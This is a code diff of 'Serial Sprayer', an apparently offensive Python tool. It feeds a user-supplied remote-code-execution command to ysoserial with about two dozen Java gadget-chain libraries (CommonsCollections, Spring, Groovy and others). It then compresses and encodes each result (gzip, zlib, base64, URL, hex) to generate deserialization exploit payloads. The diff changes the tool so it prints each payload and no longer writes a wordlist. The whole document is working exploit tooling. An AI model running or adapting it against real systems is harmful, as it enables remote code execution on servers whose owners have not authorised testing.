@@ -2,15 +2,13 @@
 """ Built-in modules """
 import argparse
 import logging
+import re
 import sys
 import urllib.parse
+import urllib.request
 import zlib
 from pathlib import Path
 from subprocess import check_output, PIPE, Popen
-
-
-# Sets the default output file name if optional param is not set #
-DEFAULT_OUT_FILE = 'ss_wordlist.txt'
 
 
 def url_exec(input_bytes: bytes) -> bytes:
@@ -20,8 +18,9 @@ def url_exec(input_bytes: bytes) -> bytes:
     :param input_bytes:  The string to be URL encoded.
     :return:  The URL encoded string.
     """
-    # Return the passed in string as url-encoded #
-    return urllib.parse.quote_plus(input_bytes).encode()
+    # Return the passed in string as url-encoded with lowercase letters #
+    return conf_obj.re_url_upper.sub(lambda match_obj: match_obj.group(0).lower(),
+                                     urllib.parse.quote(input_bytes)).encode(errors='replace')
 
 
 def ascii_hex_exec(input_bytes: bytes) -> bytes:
@@ -32,7 +31,7 @@ def ascii_hex_exec(input_bytes: bytes) -> bytes:
     :return:  The hex encoded string.
     """
     # Return the passed in string as hex #
-    return input_bytes.hex().encode()
+    return input_bytes.hex().encode(errors='replace')
 
 
 def base64_url_exec(input_bytes: bytes) -> bytes:
@@ -70,7 +69,7 @@ def zlib_exec(input_bytes: bytes) -> bytes:
     return zlib.compress(input_bytes)
 
 
-def gunzip_exec(input_bytes: bytes) -> bytes:
+def gzip_exec(input_bytes: bytes) -> bytes:
     """
     Gunzip compresses the passed in input string and returns.
 
@@ -78,7 +77,7 @@ def gunzip_exec(input_bytes: bytes) -> bytes:
     :return:  The compressed gunzip data.
     """
     # Return the passed in string as gzip compressed data #
-    return sys_cmd(['gzip', '-c'], input_bytes)
+    return sys_cmd(['gzip'], input_bytes)
 
 
 def out_chain_gen(java_data: bytes, config_obj: object) -> bytes:
@@ -96,7 +95,7 @@ def out_chain_gen(java_data: bytes, config_obj: object) -> bytes:
         try:
             # Look up the current methods routine in hash table,
             # overwrite output variable per routine #
-            chain_out = config_obj.routines[method](java_data)
+            chain_out = config_obj.routines[method](java_data).strip()
 
         # If attempting to access key that does not exist #
         except KeyError:
@@ -124,7 +123,7 @@ def sys_cmd(cmd_syntax: list, input_bytes: bytes):
         logging.error('Error occurred during command execution: %s', stderr)
         sys.exit(3)
 
-    return stdout
+    return stdout.strip()
 
 
 def main(config_obj: object):
@@ -135,29 +134,15 @@ def main(config_obj: object):
     :param config_obj:  The program configuration instance.
     :return:  Nothing
     """
-    try:
-        # Open the output wordlist in append bytes mode #
-        with config_obj.out_file.open('ab') as out_file:
-            # Iterate through the tuple of ysoserial library names #
-            for library in config_obj.ysoserial_libs:
-                print(f'[+] Executing ysoserial {library} ', end='')
-                # Execute ysoserial with current iteration library and the specified payload #
-                ysoserial_out = check_output([config_obj.java_path, '-jar',
-                                              str(config_obj.ysoserial_path), library,
-                                              config_obj.payload])
-                print(f'=> Output chain: {config_obj.chain_reference}')
-                # Pass the serialized data to the output compression/encoding chain #
-                serial_payload = out_chain_gen(ysoserial_out, config_obj)
-                print(f'[!] {library} payload complete\n')
-                # Write the final payload to the output file #
-                out_file.write(serial_payload + b'\n')
+    # Iterate through the tuple of ysoserial library names #
+    for library in config_obj.ysoserial_libs:
+        # Execute ysoserial with current iteration library and the specified payload #
+        ysoserial_out = check_output([config_obj.java_path, '-jar', str(config_obj.ysoserial_path),
+                                      library, config_obj.payload])
+        # Pass the serialized data to the output compression/encoding chain #
+        payload = out_chain_gen(ysoserial_out, config_obj)
 
-    # If error occurs during file operating #
-    except OSError as file_err:
-        # Print error, log, and exit #
-        print_err(f'Error occurred during file operation: {file_err}')
-        logging.error('Error occurred during file operation: %s', file_err)
-        sys.exit(3)
+        print(f'{library}:\n\n{payload.decode(errors="replace")}\n\n')
 
 
 def print_err(msg: str):
@@ -181,16 +166,16 @@ class ProgramConfig:
         self.payload = None
         self.chain_reference = None
         self.out_chain = None
-        self.ysoserial_libs = ('BeanShell1', 'C3P0', 'Click1', 'CommonsBeanutils1',
+        self.re_url_upper = re.compile(r'%[0-9A-F]{2}')
+        self.ysoserial_libs = ('BeanShell1',  'Click1', 'CommonsBeanutils1',
                                'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
                                'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6',
                                'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2',
                                'JBossInterceptors1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1',
-                               'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1',
+                               'MozillaRhino2', 'Myfaces1', 'ROME', 'Spring1',
                                'Spring2', 'Vaadin1')
-        self.out_file = None
         # Map compression/encoding function references to their corresponding key #
-        self.routines = {'gzip': gunzip_exec, 'zlib': zlib_exec, 'base64': base64_exec,
+        self.routines = {'gzip': gzip_exec, 'zlib': zlib_exec, 'base64': base64_exec,
                          'base64-url': base64_url_exec, 'ascii-hex': ascii_hex_exec,
                          'url': url_exec}
         # Confirm that Java exists on the system with the which command #
@@ -201,6 +186,7 @@ class ProgramConfig:
             print_err('The system does not have Java install, fix that and try again')
             sys.exit(2)
 
+        # Strip off newline when saving java path in config instance #
         self.java_path = has_java[:-1]
 
     def validate_file(self, string_path: str, is_required=False) -> Path:
@@ -291,19 +277,18 @@ if __name__ == '__main__':
     RET = 0
 
     # Parse command line arguments #
-    arg_parser = argparse.ArgumentParser(usage='%(prog)s [options] \'ysoserial_path\' \'payload\' '
-                                               '\'out_chain\'',
+    arg_parser = argparse.ArgumentParser(usage='%(prog)s [options] ysoserial_path \'payload\''
+                                               ' \'out_chain\'',
                                          description='Serial Sprayer takes the input payload and '
                                                      'generates it with each ysoserial library. The'
                                                      ' output is then compressed/encoded specified '
                                                      'by the out_chain parameter and written to a '
-                                                     'wordlist.')
+                                                     'wordlist (Check readme for more usages.')
     arg_parser.add_argument('ysoserial_path', help='The path to the ysoserial JAR file on disk')
     arg_parser.add_argument('payload', help='The RCE payload to serialized by ysoserial')
     arg_parser.add_argument('out_chain', help='The compression/encoding chain the output is piped '
                                               'to. Supported methods: gzip, zlib, base64, '
                                               'base64-url, ascii-hex, url. Ex: \'gzip|base64|url\'')
-    arg_parser.add_argument('--out_file', help='The output wordlist where the payloads are stored')
     parsed_args = arg_parser.parse_args()
 
     # Initialize the program configuration instance #
@@ -314,14 +299,6 @@ if __name__ == '__main__':
     conf_obj.payload = parsed_args.payload
     # Parse the various encodings as an encoding list
     conf_obj.validate_out_chain(parsed_args.out_chain)
-    # If an output file path was specified #
-    if parsed_args.out_file:
-        # Confirm the output file path #
-        conf_obj.out_file = conf_obj.validate_file(parsed_args.out_file)
-    # Id an output file was not specified #
-    else:
-        # Set the default output file path #
-        conf_obj.out_file = conf_obj.cwd / DEFAULT_OUT_FILE
 
     # Set up the log file and logging facilities #
     logging.basicConfig(filename='SerialSpray.log', level=logging.DEBUG,
